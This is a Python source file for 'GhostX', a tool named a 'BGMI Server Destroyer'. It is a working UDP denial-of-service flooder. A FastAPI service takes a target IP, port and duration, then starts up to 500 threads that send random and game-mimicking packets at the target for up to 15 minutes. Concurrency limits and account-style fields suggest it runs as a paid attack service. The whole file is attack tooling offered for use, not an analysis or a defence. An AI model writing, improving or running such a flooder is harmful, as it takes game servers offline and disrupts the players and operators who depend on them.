# bgmi_flooder.py
# THE BEAST - BGMI Server Destroyer
# API Key: ghostx_official

import asyncio
import socket
import random
import time
import uuid
import threading
import struct
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from contextlib import asynccontextmanager
from concurrent.futures import ThreadPoolExecutor

from fastapi import FastAPI, HTTPException, Header
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

# ============================================================
# CONFIGURATION
# ============================================================

API_KEY = "ghostx_official"  # Your API key babe
MAX_CONCURRENT_ATTACKS = 20
MAX_DURATION_SECONDS = 900
DEFAULT_THREADS = 150
MAX_THREADS = 500
PACKET_DELAY_MS = 0.00005  # FASTER

# ALL ports are allowed for TARGETS (this is the FLOODER, not the bot)
# The bot blocks ports for its OWN API calls, not for attacking

active_attacks: Dict[str, dict] = {}
attack_counter = 0

# ============================================================
# PACKET GENERATORS
# ============================================================

class BGMI_Packets:
    @staticmethod
    def random_payload(min_size=64, max_size=1400):
        return bytes([random.randint(0, 255) for _ in range(random.randint(min_size, max_size))])
    
    @staticmethod
    def bgmi_heartbeat():
        seq = random.randint(1, 65535)
        timestamp = int(time.time())
        return struct.pack('!BHI', 0x01, seq, timestamp) + BGMI_Packets.random_payload(16, 32)
    
    @staticmethod
    def bgmi_position_update():
        x = random.uniform(0, 1000)
        y = random.uniform(0, 1000)
        z = random.uniform(0, 100)
        return struct.pack('!Bfff', 0x03, x, y, z) + BGMI_Packets.random_payload(8, 16)

# ============================================================
# FLOODING ENGINES
# ============================================================

class BeastFlooder:
    @staticmethod
    def udp_worker(target_ip, target_port, duration, stop_event, stats, worker_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
            
            payloads = [
                b'A' * 64, b'B' * 128, b'C' * 256, b'D' * 512,
                b'E' * 1024, b'F' * 1400,
                BGMI_Packets.bgmi_heartbeat(),
                BGMI_Packets.bgmi_position_update(),
                BGMI_Packets.random_payload(64, 1400)
            ]
            
            end_time = time.time() + duration
            packet_count = 0
            
            while time.time() < end_time and not stop_event.is_set():
                payload = random.choice(payloads)
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    packet_count += 1
                except:
                    pass
                
                if packet_count % 2000 == 0:
                    time.sleep(PACKET_DELAY_MS)
            
            stats[worker_id] = packet_count
            sock.close()
        except:
            stats[worker_id] = 0
    
    @staticmethod
    async def udp_flood_massive(target_ip: str, target_port: int, duration: int, 
                                 attack_id: str, threads: int = DEFAULT_THREADS):
        stop_event = threading.Event()
        stats = {}
        threads = min(threads, MAX_THREADS)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i in range(threads):
                future = executor.submit(
                    BeastFlooder.udp_worker,
                    target_ip, target_port, duration, stop_event, stats, i
                )
                futures.append(future)
            
            await asyncio.sleep(duration)
            stop_event.set()
        
        total_packets = sum(stats.values())
        
        if attack_id in active_attacks:
            active_attacks[attack_id]["status"] = "completed"
            active_attacks[attack_id]["packets_sent"] = total_packets
        
        return total_packets

# ============================================================
# FASTAPI APP
# ============================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    print("💀" + "=" * 55)
    print("  GHOSTX OFFICIAL - BGMI Beast Flooder")
    print("=" * 55)
    print(f"  API Key: {API_KEY}")
    print(f"  Max Concurrent: {MAX_CONCURRENT_ATTACKS}")
    print(f"  Max Duration: {MAX_DURATION_SECONDS}s")
    print(f"  Threads per Attack: {DEFAULT_THREADS}")
    print("=" * 55 + "💀")
    yield

app = FastAPI(title="GhostX Official Flooder", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

class AttackRequest(BaseModel):
    ip: str
    port: int
    duration: int
    method: Optional[str] = "udp"

@app.get("/api/v1/health")
async def health_check():
    return {
        "status": "ok",
        "timestamp": datetime.utcnow().isoformat(),
        "version": "GHOSTX-3.0",
        "active_attacks": len([a for a in active_attacks.values() if a.get("status") == "running"])
    }

@app.get("/api/v1/active")
async def get_active_attacks():
    active = []
    for attack_id, attack in active_attacks.items():
        if attack.get("status") == "running":
            ends_at = attack.get("started_at") + timedelta(seconds=attack.get("duration", 0))
            expires_in = int((ends_at - datetime.utcnow()).total_seconds())
            if expires_in > 0:
                active.append({
                    "attackId": attack_id,
                    "target": f"{attack.get('ip')}:{attack.get('port')}",
                    "expiresIn": expires_in
                })
    
    return {
        "success": True,
        "activeAttacks": active,
        "count": len(active),
        "maxConcurrent": MAX_CONCURRENT_ATTACKS,
        "remainingSlots": MAX_CONCURRENT_ATTACKS - len(active)
    }

@app.post("/api/v1/attack")
async def launch_attack(request: AttackRequest, x_api_key: Optional[str] = Header(None)):
    global attack_counter
    
    # API Key check
    if x_api_key != API_KEY:
        return {"success": False, "error": "Invalid API key", "message": "Use key: ghostx_official"}
    
    if request.duration < 1 or request.duration > MAX_DURATION_SECONDS:
        return {"success": False, "error": f"Duration must be 1-{MAX_DURATION_SECONDS}s"}
    
    current_running = len([a for a in active_attacks.values() if a.get("status") == "running"])
    if current_running >= MAX_CONCURRENT_ATTACKS:
        return {"success": False, "error": f"Max concurrent: {MAX_CONCURRENT_ATTACKS}"}
    
    attack_counter += 1
    attack_id = f"{int(time.time())}-{attack_counter}"
    
    active_attacks[attack_id] = {
        "id": attack_id,
        "ip": request.ip,
        "port": request.port,
        "duration": request.duration,
        "status": "running",
        "started_at": datetime.utcnow()
    }
    
    asyncio.create_task(BeastFlooder.udp_flood_massive(
        request.ip, request.port, request.duration, attack_id, DEFAULT_THREADS
    ))
    
    async def cleanup():
        await asyncio.sleep(request.duration + 5)
        if attack_id in active_attacks:
            active_attacks[attack_id]["status"] = "completed"
    
    asyncio.create_task(cleanup())
    
    return {
        "success": True,
        "attack_id": attack_id,
        "message": f"💀 GHOSTX - Flooding {request.ip}:{request.port} for {request.duration}s",
        "limits": {
            "currentActive": current_running + 1,
            "maxConcurrent": MAX_CONCURRENT_ATTACKS,
            "remainingSlots": MAX_CONCURRENT_ATTACKS - (current_running + 1)
        },
        "account": {"status": "active", "daysRemaining": 365}
    }

@app.get("/api/v1/stats")
async def get_stats():
    return {
        "success": True,
        "total_attacks": len(active_attacks),
        "running": len([a for a in active_attacks.values() if a.get("status") == "running"])
    }

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)
